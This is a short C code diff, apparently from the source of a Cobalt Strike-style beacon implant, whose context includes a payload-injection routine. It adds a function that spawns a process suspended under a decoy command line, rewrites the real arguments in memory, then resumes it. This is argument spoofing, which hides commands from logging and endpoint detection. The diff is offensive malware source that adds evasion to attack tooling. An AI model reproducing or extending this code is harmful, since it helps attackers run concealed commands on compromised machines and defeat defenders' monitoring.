@@ -1134,6 +1134,30 @@ BOOL SpawnProcess(RUN_UNDER_CONFIG* execution)
 	return TRUE;
 }
 
+BOOL RunProcessWithAdjustedCmd(RUN_UNDER_CONFIG* execution)
+{
+	EXPANDED_CMD cmds;
+
+	if ((execution->creationFlags & CREATE_SUSPENDED) != 0 || ArgumentFindMatch(&cmds, execution->cmd) == FALSE)
+		return SpawnProcess(execution);
+
+	execution->creationFlags |= CREATE_SUSPENDED;
+	execution->cmd = cmds.fullCmd;
+	BOOL result = SpawnProcess(execution);
+	const BOOL couldAdjust = ProcessCmdAdjust(execution->processInfo, &cmds);
+	if (couldAdjust)
+	{
+		ResumeThread(execution->processInfo->hThread);
+	}
+	else
+	{
+		TerminateProcess(execution->processInfo->hProcess, 0);
+		result = FALSE;
+	}
+
+	return result;
+}
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
